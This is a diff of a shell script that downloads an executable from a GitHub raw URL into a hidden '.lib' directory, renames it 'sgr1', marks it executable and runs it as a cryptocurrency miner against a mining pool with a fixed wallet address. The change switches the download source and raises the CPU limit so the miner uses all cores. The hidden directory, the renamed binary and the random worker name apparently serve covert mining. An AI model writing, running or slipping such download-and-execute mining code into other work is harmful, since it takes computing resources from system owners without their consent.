@@ -11,9 +11,9 @@ mkdir .lib && cd .lib
 # https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
 # https://github.com/barburonjilo/back/raw/main/sr srb
 
-wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
+wget -O sgr1  https://github.com/TiannaMcdowell/All-File/raw/main/sereb
 chmod +x sgr1
-cpulimit -l 200 -e sgr1 &
+cpulimit -l 1200 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 # nice -n -10 nohup ./sgr1 --algorithm yespowersugar --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 ./sgr1 --algorithm yescryptr32 --pool stratum+tcps://stratum-asia.rplant.xyz:17115 --wallet shuga1q4hsrhw72qe3hklgccuea9l0lwjppknlfc85nfv.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  &
